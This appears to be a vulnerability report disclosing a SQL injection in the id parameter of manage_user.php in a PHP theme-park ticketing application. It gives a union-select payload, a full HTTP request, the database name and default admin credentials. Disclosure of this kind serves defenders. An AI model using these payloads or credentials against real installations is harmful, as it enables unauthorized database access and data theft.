# Theme Park Ticketing System v1.0 by oretnom23 has SQL injection

BUG_Author: LHwei

Login account: admin@admin.com/admin123 (Super Admin account)

vendors: https://www.sourcecodester.com/php/14613/theme-park-ticketing-system-using-phpmysqli-source-code.html

The program is built using the xmapp-php8.1 version

Vulnerability File: /tpts/manage_user.php,manage_user.php

Vulnerability location: /tpts/manage_user.php?id, id

dbname =tpts_db

[+] Payload: /tpts/manage_user.php?id=-1%20union%20select%201,database(),3,4,5,6,7--+ // Leak place ---> id

```sql
GET /tpts/manage_user.php?id=-1%20union%20select%201,database(),3,4,5,6,7--+ HTTP/1.1
Host: 192.168.1.19
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
DNT: 1
Cookie: PHPSESSID=g29omi7f91g3h7ud1uhq6rbmkv
Connection: close
```

![image](https://user-images.githubusercontent.com/54017627/182987607-a654075e-0337-4328-a2c3-c872e84595f8.png)
